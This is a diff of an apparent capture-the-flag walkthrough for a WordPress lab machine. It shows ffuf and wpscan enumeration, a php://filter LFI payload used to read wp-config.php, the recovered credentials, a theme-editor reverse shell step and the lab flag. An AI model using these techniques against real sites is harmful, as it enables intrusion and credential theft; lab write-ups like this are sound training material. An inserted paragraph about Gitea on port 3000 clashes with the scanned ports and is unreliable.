@@ -2,21 +2,21 @@
 sticker: emoji//0031-fe0f-20e3
 ---
 
-# ALL IN ONE
+# ENUMERATION
+---
 
-## ENUMERATION
 
-***
 
-### OPEN PORTS
+## OPEN PORTS
+---
 
-***
 
 | PORT | SERVICE |
-| ---- | ------- |
+| :--- | :------ |
 | 21   | FTP     |
 | 22   | SSH     |
 | 80   | HTTP    |
+
 
 ```
 PORT   STATE SERVICE REASON  VERSION
@@ -51,19 +51,26 @@ PORT   STATE SERVICE REASON  VERSION
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-## RECONNAISSANCE
+```
+The application running on the web server on port 3000 is the software development platform Gitea, recognizable by the set cookie `i_like_gitea`.
 
-***
+![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FefVGb1ZXLw4R9GYPR7E4%252Fimage.png%3Falt%3Dmedia%26token%3Dbf2153c1-05be-461f-9ef7-cdc31a95d044&width=768&dpr=4&quality=100&sign=6b09f8dc&sv=2)
+```
+
+# RECONNAISSANCE
+---
 
 We can see that anonymous login is enabled based on the scan, let's check out FTP:
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+![](images/Pasted%20image%2020250321140200.png)
+
 
 Nothing in here, let's proceed to the website then:
 
-<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+![](images/Pasted%20image%2020250321140441.png)
 
 Simple apache2 page, let's fuzz:
+
 
 ```
 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.171.205/FUZZ" -ic -c -t 200
@@ -112,9 +119,12 @@ Try H@ckme@123
 
 Let's save this for now, let's check the WordPress one:
 
+
+
 ![](images/Pasted%20image%2020250321141902.png)
 
 We can enumerate some basic stuff with wpscan:
+
 
 ```
 wpscan --url "http://10.10.171.205/wordpress" --enumerate ap -t 50
@@ -222,9 +232,9 @@ As seen, we got the `mail_masta` plugin enabled, this plugin is well known to be
 
 ![](images/Pasted%20image%2020250321150756.png)
 
-## EXPLOITATION
 
-***
+# EXPLOITATION
+---
 
 Since we have LFI, and the password we found does not work for the user `elyana`, let's try to read `wp-config.php` file, if we do it normally:
 
@@ -236,9 +246,11 @@ We get an internal server error, for this, let's use a `php wrapper` in the foll
 php://filter/convert.base64-encode/resource=../../../../../wp-config.php
 ```
 
+
 ![](images/Pasted%20image%2020250321160230.png)
 
 And now we get the contents of the file in the format of base64, let's decode it and analyze it:
+
 
 ![](images/Pasted%20image%2020250321160332.png)
 
@@ -248,13 +260,19 @@ There we go, we got the credentials:
 elyana:H@ckme@123
 ```
 
+
 Let's log into the panel:
+
 
 ![](images/Pasted%20image%2020250321161038.png)
 
+
 From this point, we can get a shell by exploiting the theme editor, let's do it:
 
+
 ![](images/Pasted%20image%2020250321161252.png)
+
+
 
 Let's change the contents of it to a reverse shell:
 
@@ -270,9 +288,13 @@ http://<target>/wordpress/wp-content/themes/twentyseventeen/404.php
 
 And we got a shell, let's proceed with privesc.
 
-## PRIVILEGE ESCALATION
 
-***
+
+
+
+# PRIVILEGE ESCALATION
+---
+
 
 First step is stabilizing our session:
 
@@ -331,5 +353,6 @@ THM{uem2wigbuem2wigb68sn2j1ospi868sn2j1ospi8}
 ```
 
 ![](images/Pasted%20image%2020250321163201.png)
+
 
 sudo apt update && sudo apt full-upgrade -y
